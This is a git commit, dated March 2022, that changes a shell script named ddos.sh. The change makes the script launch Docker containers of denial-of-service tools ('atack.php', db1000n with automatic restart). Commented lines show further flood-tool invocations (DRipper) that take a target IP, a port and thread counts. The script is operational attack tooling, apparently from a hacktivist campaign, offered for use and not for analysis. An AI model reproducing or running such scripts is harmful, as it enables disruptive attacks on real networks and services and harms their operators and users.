590481fd0b587f00097ee28ead4c30cf8a35286f
Andrew G Sorokin <angello@elm.dp.ua>
2022-03-06 18:02:41 +0200

    add atack.php

--- ddos.sh
+++ ddos.sh
@@ -12,9 +12,9 @@ cd /root/stopWar
 #    else
 #	/usr/bin/docker run -d alexmon1989/dripper:latest -s $ip -p $port -t 500 -m $proto > docker.list
 #	/usr/bin/docker run -d cherniavsky94/stop-war python3 DRipper.py -s $ip -p $port -t 443 -q 10000 > docker.list
-#	/usr/bin/docker run -d angello2docker/atack.php >> docker.list
-#	/usr/bin/docker run -d ghcr.io/opengs/uashield:0.0.x 1024 true  >> docker.list
-	/usr/bin/docker run -d --restart always ghcr.io/arriven/db1000n >> docker.list
 #    fi
 #done
+	/usr/bin/docker run -d angello2docker/atack.php >> docker.list
+#	/usr/bin/docker run -d ghcr.io/opengs/uashield:0.0.x 1024 true  >> docker.list
+	/usr/bin/docker run -d --restart always ghcr.io/arriven/db1000n >> docker.list
 
